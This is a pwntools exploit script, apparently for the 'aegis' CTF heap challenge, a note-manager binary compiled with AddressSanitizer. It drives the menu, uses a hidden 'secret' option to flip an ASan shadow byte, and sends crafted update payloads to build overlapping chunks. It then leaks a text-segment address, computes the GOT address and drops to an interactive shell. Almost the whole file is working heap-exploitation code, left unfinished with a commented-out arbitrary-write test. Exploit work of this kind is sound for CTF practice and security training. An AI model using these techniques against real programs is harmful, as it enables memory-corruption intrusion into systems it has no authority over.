#!/usr/bin/python
from pwn import *
context.binary = "./aegis"
context.arch = "amd64"
context.os = "linux"
context.log_level='debug'
context.terminal  = ["tmux", "sp", "-h"]
p = gdb.debug("./aegis", gdbscript='''
              b *(0x555555554000 + 0x114250)
              b *(0x555555554000 + 0x1145f0)
              b *(0x555555554000 + 0x1147e0)
              b *(0x555555554000 + 0x1146d6)
                            b *(0x555555554000 + 0x1146ec)
              ''')
              # b *(0x555555554000 + 0x114357)
              # add_note b *(0x555555554000 + 0x114250)
              # update_note b *(0x555555554000 + 0x1145f0)
              # delete               b *(0x555555554000 + 0x1147e0)

def add_note(size, content, ID):
    p.sendline("1")
    print(p.recv())
    p.sendline("{}".format(size))
    print(p.recv())
    p.send("{}".format(content))
    print(p.recv())
    p.sendline("{}".format(ID))
    print(p.recv())

def show_note(index):
    p.sendline("2")
    print(p.recv())
    p.sendline("{}".format(index))
    return p.recv()

def update_note_sendline(index, new_content, new_ID):
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.sendline("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))
    print(p.recv())

def update_note(index, new_content, new_ID):
    p.sendline("3")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())
    p.send("{}".format(new_content))
    print(p.recv())
    p.sendline("{}".format(new_ID))
    print(p.recv())

def delete_note(index):
    p.sendline("4")
    print(p.recv())
    p.sendline("{}".format(index))
    print(p.recv())

def secret(addr):
    p.sendline("666")
    print(p.recv())
    p.sendline("{}".format(addr))
    print(p.recv())

def exit():
    p.sendline("5")
    print(p.recv())


def to_asan(addr):
    return ((addr >> 3) + 0x7fff8000)

print(p.recv())
VAL = 0xffffffffffffffff
# add_note(128, "a"*120, VAL)
# add_note(128, "b"*120, VAL)
# secret(0x0c187fff8018)
# update_note(0, "c"*(133), VAL)
# delete_note(1)
# add_note(128, "D"*120, VAL)p # update_note(0, "c"*(133), VAL)

# add_note(24, "a"*16, VAL)
# add_note(24, "b"*16, VAL)
add_note(16, "a"*8, VAL)

addr = to_asan(0x602000000020)
print "magiccc", hex(addr)
secret(addr)

# do 1st update
update_note(0, 'C'*18, 0xffff)

# do 2nd update
payload  = 'd'*16 + '\x02'*3
payloadid = 0xffffffff02ffffff
update_note_sendline(0, payload, payloadid)

delete_note(0)

# arb write
# add_note(16, p64(0x602000000030), 0)
# update_note(0, p64(0xdeadbeef) + '\n', 0)
# update_note(0, p64(0x0)*2, 0x0)


# heap leak 
add_note(16, p64(0x602000000018), 0)
# update_note(0, 'G'*7 + '\n', 0x1)
text_leak = show_note(0)
text_leak = text_leak.split('Content: ')[1].split("\n")[0]
text_leak = u64(text_leak.ljust(8, '\x00'))
print "text_leak", hex(text_leak)
got_addr = text_leak - 0x114ab0 + 0x347de0
print "got addr", hex(got_addr)

p.interactive()
